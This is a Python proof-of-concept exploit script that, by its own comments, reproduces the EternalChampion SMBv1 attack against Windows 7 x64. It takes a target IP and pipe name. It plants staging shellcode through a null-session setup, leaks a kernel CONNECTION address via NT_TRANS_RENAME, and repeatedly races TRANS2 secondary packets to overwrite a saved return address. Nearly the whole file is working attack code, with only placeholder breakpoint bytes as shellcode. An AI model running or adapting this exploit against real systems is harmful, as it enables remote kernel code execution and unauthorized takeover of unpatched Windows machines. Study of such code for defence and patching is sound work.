#!/usr/bin/python
from impacket import smb
from mysmb import MYSMB
from struct import pack, unpack
import sys

'''
PoC: demonstrates how NSA eternalchampion works

Note:
- this PoC is tested against only Windows 7 x64 with 2 and 4 logical processors
- no support user authentication
- the NSA eternalchampion need named pipe or share name to leak info with NT_TRANS_RENAME
- the required data for Windows is CONNECTION address. A CONNECTION struct has UNICODE_STRING 
    which size is controlled by SMB_COM_SESSION_SETUP_ANDX command
'''


if len(sys.argv) != 3:
	print("{} <ip> <pipe_name>".format(sys.argv[0]))
	sys.exit(1)

target = sys.argv[1]
pipe_name = sys.argv[2]

# this one must do something to restore execution
# Note: when staging shellcode is executed, CONNECTION+0x3d0 is at top of stack
staging_sc = '\xcc'*128

def login_put_staging_sc(conn, staging_sc, maxBufferSize):
	_, flags2 = conn.get_flags()

	# FLAGS2_EXTENDED_SECURITY MUST not be set
	flags2 &= ~smb.SMB.FLAGS2_EXTENDED_SECURITY

	# if not use unicode, buffer size on target machine is doubled because converting ascii to utf16
	flags2 |= smb.SMB.FLAGS2_UNICODE
	conn.set_flags(flags2=flags2)
		
	pkt = smb.NewSMBPacket()

	sessionSetup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
	sessionSetup['Parameters'] = smb.SMBSessionSetupAndX_Extended_Parameters()
	sessionSetup['Parameters']['MaxBufferSize']      = maxBufferSize
	sessionSetup['Parameters']['MaxMpxCount']        = 2  # can by any value
	sessionSetup['Parameters']['VcNumber']           = 2  # any non-zero
	sessionSetup['Parameters']['SessionKey']         = 0
	sessionSetup['Parameters']['SecurityBlobLength'] = 0  # this is OEMPasswordLen field in another format. 0 for NULL session
	# UnicodePasswordLen field is in Reserved for extended security format.
	sessionSetup['Parameters']['Capabilities']       = smb.SMB.CAP_EXTENDED_SECURITY | smb.SMB.CAP_USE_NT_ERRORS

	# allocate nonpaged pool size 0x15ff (padding 1 byte, AccountName 2 bytes, PrimaryDomain 2 bytes)
	# UNICODE.maxBufferSize: 0x15ff
	# after maxBufferSize is padding which is '\x00'*4
	# so code is 'ff 15 00 00 00 00' => call [rip+0]
	# after padding is pointer to allocated npp and shellcode there
	sessionSetup['Data'] = pack('<H', 0x1604) + '\x00'*5 + staging_sc + '\x00'*8
	pkt.addCommand(sessionSetup)

	conn.sendSMB(pkt)
	recvPkt = conn.recvSMB()
	if recvPkt.isValidAnswer(smb.SMB.SMB_COM_SESSION_SETUP_ANDX):
		print('SMB1 session setup allocate nonpaged pool success')
		conn.set_uid(recvPkt['Uid'])
	else:
		print('SMB1 session setup allocate nonpaged pool failed')
		sys.exit()


conn = MYSMB(target)

login_put_staging_sc(conn, staging_sc, 512)


# if share name is disk, the race is easier to win because there are more operation to do after InData is modified
tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
conn.set_default_tid(tid)
fid = conn.nt_create_andx(tid, pipe_name)  # any valid share name should be OK


# ================================
# leak a transaction
# ================================
for i in range(10):
	conn.send_trans('', totalDataCount=0xdb0, maxSetupCount=0, maxParameterCount=0, maxDataCount=0)

mid_ntrename = conn.next_mid()
# create NT_TRANS_RENAME (5) request
req1 = conn.create_nt_trans_packet(5, mid=mid_ntrename, param=pack('<HH', fid, 0), data='A'*0x1b8, maxParameterCount=0x4e48)
# leak 264 bytes
req2 = conn.create_nt_trans_secondary_packet(mid_ntrename, data='A'*264)
reqs = [ conn.create_trans_packet('', totalDataCount=0xdb0, maxSetupCount=0, maxParameterCount=0, maxDataCount=0) for i in range(15) ]

conn.send_raw(req1[:-8])
conn.send_raw(req1[-8:]+req2+''.join(reqs))

data = conn.recv_transaction_data(mid_ntrename, 0x1b8+264)
leakData = data[0x1c0:]  # skip data
# find TRANSACTION struct to get CONNECTION address
pos = data.find('LStr')
leakTrans = data[pos+4+0x18:]
connection_addr = unpack('<Q', leakTrans[0x10:0x18])[0]
print('found CONNECTION address: 0x{:x}'.format(connection_addr))


def nsa_race(conn, jmp_addr):
	setup = pack('<H', 5)  # QUERY_PATH_INFO
	
	# set info level to SMB_INFO_QUERY_EA_SIZE at request to force SrvSmbQueryPathInformation restart in another thread
	param = pack('<HI', 2, 0) + '\x00'*4  # infoLevel, reserved, filename
	mid = conn.next_mid()
	# we will overwrite 8 bytes at displacement 312, so data must be at least 320 bytes
	req1 = conn.create_trans2_packet(setup, param=param, data='A'*324, mid=mid)
	# change infoLevel to SMB_INFO_IS_NAME_VALID
	req2 = conn.create_trans2_secondary_packet(mid, param=pack('<H', 6))
	req3 = conn.create_trans2_secondary_packet(mid, data=pack('<Q', jmp_addr), dataDisplacement=312)

	conn.send_raw(req1+req2+req3*8)
	recvPkt = conn.recvSMB()
	status = recvPkt.getNTStatus()
	if status == 0xc0000022: # ACCESS_DENIED
		#print('the race is completely fail')
		sys.stdout.write('.')
	elif status == 0xc0000010:  # INVALID_DEVICE_REQUEST
		# fail to modify infoLevel parameter to SMB_INFO_IS_NAME_VALID
		#print('there is a race')
		sys.stdout.write('*')
	else:
		sys.stdout.write('?')
	sys.stdout.flush()


def my_race(conn, jmp_addr):
	setup = pack('<H', 5)  # QUERY_PATH_INFO
	param = pack('<HI', 6, 0) + '\x00'*4  # infoLevel, reserved, filename
	
	# directly race
	for i in range(8):
		mid = conn.next_mid()
		req1 = conn.create_trans2_packet(setup, param=param, data='A'*324, mid=mid)
		req3 = conn.create_trans2_secondary_packet(mid, data=pack('<Q', jmp_addr), dataDisplacement=312)
		conn.send_raw(req1+req3*11)
	for i in range(8):
		recvPkt = conn.recvSMB()
		if recvPkt.getNTStatus() != 0xc0000010:
			#print('return status: 0x{:x}'.format(recvPkt.getNTStatus()))
			sys.stdout.write('*')
		else:
			sys.stdout.write('.')
		sys.stdout.flush()

# jump to CONNECTION+0x3ca
while True:
	# if win a race, saved RIP will be modified
	nsa_race(conn, connection_addr+0x3ca)
	#my_race(conn, connection_addr+0x3ca)


conn.disconnect_tree(tid)
conn.logoff()
conn.get_socket().close()
